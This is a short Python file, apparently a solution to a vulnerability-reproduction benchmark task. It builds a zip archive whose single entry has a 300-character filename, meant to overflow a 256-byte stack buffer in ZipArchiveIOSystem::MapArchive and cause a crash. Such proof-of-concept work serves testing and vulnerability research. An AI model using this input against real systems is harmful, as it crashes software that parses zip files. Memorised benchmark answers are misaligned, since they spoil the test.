import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a stack buffer overflow in ZipArchiveIOSystem::MapArchive.
        A buffer of 256 bytes is allocated on the stack for a filename.
        A filename from the zip archive longer than 256 bytes will overflow this buffer.

        To create a PoC, we generate a zip file containing a single entry with
        a filename longer than 256 characters. A length of 300 is chosen to be
        sufficiently large to overwrite critical stack data (like the return address)
        and cause a crash, while keeping the PoC file size small for a better score.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC, a zip file in bytes format.
        """
        # A filename longer than 256 characters is required.
        # Using 300 'A's is a standard way to create an overflow string.
        long_filename = 'A' * 300

        # Create the zip file in an in-memory byte buffer.
        zip_buffer = io.BytesIO()

        # Use the zipfile library to construct a valid zip archive.
        # 'w' mode for writing, default compression is ZIP_STORED.
        with zipfile.ZipFile(zip_buffer, 'w') as zf:
            # Add a file to the archive with the long filename.
            # The content of the file is irrelevant for this vulnerability,
            # so we use empty content (b'') to keep the PoC small.
            zf.writestr(long_filename, b'')

        # Retrieve the generated zip archive as a bytes object.
        return zip_buffer.getvalue()